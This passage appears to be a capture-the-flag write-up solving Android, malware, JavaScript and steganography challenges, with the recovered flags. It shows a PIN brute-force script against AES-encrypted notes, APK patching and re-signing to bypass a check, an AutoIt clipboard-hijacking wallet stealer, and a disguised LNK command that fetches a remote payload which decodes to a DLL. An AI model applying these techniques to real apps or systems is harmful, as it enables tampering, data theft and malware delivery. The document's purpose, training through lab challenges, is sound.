0x7B0, 0x1969, 0x127, 0x1A3, 0x1C4, 0x2B9, 0x754, 0x889, 0x0F50, 0x1F0, 0x254, 0x2D9, 0x558, 0x571, 0x924, 0x1019, 0x342, 0x3AD, 0x508, 0x6E9, 0x0A30, 0x10E1, 0x1284, 0x500, 0x5D2, 0x74D,]flag = &#39;&#39;for i in range(len(arr)): temp = arr[i] - (i * i) temp = temp &amp;gt;&amp;gt; (i % 7) flag += chr(temp)print(flag) flag{7bdeac39cca13a97782c04522aece87a}MobileOTP Vaultchallange descriptionopening APK at JADX-GUI and looking at the main activitypackage com.otpvault;import com.facebook.react.ReactActivity;import com.facebook.react.ReactActivityDelegate;import com.facebook.react.ReactRootView;/* loaded from: classes.dex */public class MainActivity extends ReactActivity { @Override // com.facebook.react.ReactActivity protected String getMainComponentName() { return &quot;OTPVault&quot;; }the main activity inherits from ReactActivity this means the apk build using react-nativerunning apktool to extract all files from APKapktool d OTPVault.apklooking at the code at OTPVault.ap/assets/index.android.bundle a search for otp then copy a few lines and prettify itfunction O() { var n; (0, e.default)(this, O); for (var o = arguments.length, u = new Array(o), l = 0; l &amp;lt; o; l++) u[l] = arguments[l]; return (n = b.call.apply(b, [this].concat(u))).state = { output: &#39;Insert your OTP to unlock your vault&#39;, text: &#39;&#39; }, n.s = &#39;JJ2XG5CIMFRWW2LOM4&#39;, n.url = &#39;http://congon4tor.com:7777&#39;, n.token = &#39;652W8NxdsHFTorqLXgo=&#39;, n.getFlag = function() { var e, o; return t.default.async(function(u) { for (;;) switch (u.prev = u.next) { case 0: return u.prev = 0, e = { headers: { Authorization: &#39;Bearer KMGQ0YTYgIMTk5Mjc2NzZY4OMjJlNzAC0WU2DgiYzE41ZDwN&#39; } }, u.next = 4, t.default.awrap(p.default.get(n.url + &quot;/flag&quot;, e)); case 4: o = u.sent, n.setState({ output: o.data.flag// }), u.next = 12;sending the same request using postmanpostman request flag{5450384e093a0444e6d3d39795dd7ddd}Secure Noteschallange descriptionopening the APK in JADX-GUI and looking at login activitythe APK takes a pin code and repeats it 4 times then use it as a key for AES encryption to decrypt the databasepublic void onClick(View view) { try { C0940d.m156k(this.f2153b.getText().toString() + this.f2153b.getText().toString() + this.f2153b.getText().toString() + this.f2153b.getText().toString(), new File(this.f2154c.getPath()), new File(LoginActivity.this.getCacheDir(), &quot;notes.db&quot;)); LoginActivity.this.startActivity(this.f2155d); } catch (C0947a unused) { Toast.makeText(LoginActivity.this.getApplicationContext(), &quot;Wrong password&quot;, 0).show(); }}public static void m156k(String str, File file, File file2) { try { SecretKeySpec secretKeySpec = new SecretKeySpec(str.getBytes(), &quot;AES&quot;); Cipher cipher = Cipher.getInstance(&quot;AES&quot;); cipher.init(2, secretKeySpec); FileInputStream fileInputStream = new FileInputStream(file); byte[] bArr = new byte[(int) file.length()]; fileInputStream.read(bArr); byte[] doFinal = cipher.doFinal(bArr); FileOutputStream fileOutputStream = new FileOutputStream(file2); fileOutputStream.write(doFinal); fileInputStream.close(); fileOutputStream.close(); } catch (IOException | InvalidKeyException | NoSuchAlgorithmException | BadPaddingException | IllegalBlockSizeException | NoSuchPaddingException e) { throw new C0947a(&quot;Error encrypting/decrypting file&quot;, e); }}writing script to brute force all keys and save the decrypted Fileimport java.io.File;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.IOException;import java.security.InvalidKeyException;import java.security.NoSuchAlgorithmException;import java.util.WeakHashMap;import javax.crypto.BadPaddingException;import javax.crypto.Cipher;import javax.crypto.IllegalBlockSizeException;import javax.crypto.NoSuchPaddingException;import javax.crypto.spec.SecretKeySpec;import java.nio.file.Path;import java.nio.file.Paths;public class Main { public static void main(String args[]) { for (int i1 = 0; i1 &amp;lt; 10; i1++) { for (int i2 = 0; i2 &amp;lt; 10; i2++) { for (int i3 = 0; i3 &amp;lt; 10; i3++) { for (int i4 = 0; i4 &amp;lt; 10; i4++) { String code = Integer.toString(i1) + Integer.toString(i2) + Integer.toString(i3) + Integer.toString(i4); String str = code + code + code + code; String file = &quot;./db.encrypted&quot;; String file2 = &quot;./&quot; + code + &quot;.db&quot;; // System.out.println(&quot;Trying value: &quot; + code); try { SecretKeySpec secretKeySpec = new SecretKeySpec(str.getBytes(), &quot;AES&quot;); Cipher cipher = Cipher.getInstance(&quot;AES&quot;); cipher.init(2, secretKeySpec); // FileInputStream fileInputStream = new FileInputStream(file); // byte[] bArr = new byte[(int) file.length()]; // fileInputStream.read(bArr); Path path = Paths.get(&quot;./db.encrypted&quot;); byte[] bArr = java.nio.file.Files.readAllBytes(path); // System.out.println(&quot;Found value: &quot; + bArr.length); byte[] doFinal = cipher.doFinal(bArr); FileOutputStream fileOutputStream = new FileOutputStream(file2); fileOutputStream.write(doFinal); // fileInputStream.close(); fileOutputStream.close(); System.out.println(&quot;Found value: &quot; + code); break; } catch (IOException | InvalidKeyException | NoSuchAlgorithmException | BadPaddingException | IllegalBlockSizeException | NoSuchPaddingException e) { // System.out.println(e); } } } } } }}this script will generate many files and by running file command only one of them will be defined as JSON with correct pin 5732 flag{a5f6f2f861cb52b98ebedcc7c7094354}Click Mechallange descriptionopening the apk in JADX-GUI and looking at the Main activitypublic final void cookieViewClick(View view) { int i = this.CLICKS + 1; this.CLICKS = i; if (i &amp;gt;= 13371337) { this.CLICKS = 13371337; } ((TextView) findViewById(C0574R.C0577id.cookieCount)).setText(String.valueOf(this.CLICKS));}public final void getFlagButtonClick(View view) { Intrinsics.checkNotNullParameter(view, &quot;view&quot;); if (this.CLICKS == 99999999) { Toast.makeText(getApplicationContext(), getFlag(), 0).show(); return; } Toast.makeText(getApplicationContext(), &quot;You do not have enough cookies to get the flag&quot;, 0).show();}it is not possible to get a 99999999 clickusing apktoolapktool d click_me.apkand change the value 99999999 to 5 at smali bytecode and set extractNativeLibs as true at AndroidManifestthen compile the patched APKapktool.exe b click_me/ -o flag.apkthen create signature key and sign the APK to run itkeytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore flag.apk alias_namerun apk, click at the cookie 5 time at click get flag button flag{849d9e5421c59358ee4d568adebc5a70)MalwareOttoâ€™s Itchallange descriptionDetectItEasy identify the file as an AutoIt scriptDetectItEasyusing AutoIt extractor to get the scriptautoit extractorAnalyzing the scriptThe script is obsticated but from the description you can think about clip board as malware might change the value copied to mactch the attacker wallet address and thatis how he steal the moneySeach for Clipboard you will find a function read clipBoard and compare it to some variblesbut thier value isnâ€™t clearso i modified the code after each variable to pop up a message box with it valueexMsgBox(0,&quot;&quot;,$ckkgdnbk_rowmg_zlwyizjakm)MsgBox(0,&quot;&quot;,$var_2025)MsgBox(0,&quot;&quot;,$var_2571)MsgBox(0,&quot;&quot;,$rmkily_bsqta)and cmpiled the file and after few message box here is the flagflag flag{f4bc6d0bfcbf128c97490e392a39842b}USB Drivechallange descriptionOpen the LNK as a text filefound a lot of empty lines and at the end, this commandappears to fetch some data from a URLCMD&amp;lt;ttps://tinyurl.com/a7ba6mathe link point to some encoded datastage2decode it from base 32base32 cyberchefThe decoded file is a DLL.The analysis reveals that DllMain will show the flag at a message boxrun the dllrundll32.exe stage2.dll,DllMainflag flag{0af2873a74cfa957ccb90cef814cfe3d}MiscellaneousOne Mantissa Pleasechallange descriptionfrom this link javascripts number type 9007199254740992 IS equal to 9007199254740993 flag{3a78300a68de2a1210c9e3726c3cb87a}To Be And Not To Bechallange descriptionin javascript NaN != NaN flag{7ecfb3bf076a6a9635f975fe96ac97fd}SteganographyOstrichchallange descriptionThe script will load the image and loop over each char of the flag to find a random pixel and multiply the char of the flag with the third color value of the pixel the store then result in the pixel and save the imageIn the end, all images are converted to one apng imageWriting a script that will loop over each frame of the apng and found the different pixel and get the flagimport imageiofrom PIL import Image, GifImagePluginfrom Crypto.Util.number import long_to_bytes as l2b, bytes_to_long as b2limport randomfrom apng import APNGfilenames = []flag = &#39;x&#39; * 32orig_filename = &quot;ostrich.jpg&quot;orig_image = Image.open(orig_filename)pixels = orig_image.load()width, height = orig_image.sizeimages = []flag = &#39;&#39;im = APNG.open(&quot;result.apng&quot;)i = 0for frame, control in im.frames: frame.save(&quot;frame.png&quot;) png = Image.open(&quot;frame.png&quot;) png_pixels = png.load() for x in range(width): for y in range(height): pixel = list(png.getpixel((x, y))) if pixel[2] == 0: if pixel[0] != orig_image.getpixel((x,y))[0]: b = [pixel[0]] if pixel[1] != orig_image.getpixel((x,y))[1]: b.append(pixel[1]) l = b2l(bytes(b)) flag += chr(int(l / orig_image.getpixel((x,y))[2]))print(flag) flag{d3a5b80f96a3ce0dd0aedbefbc6b1fa1}" } ]
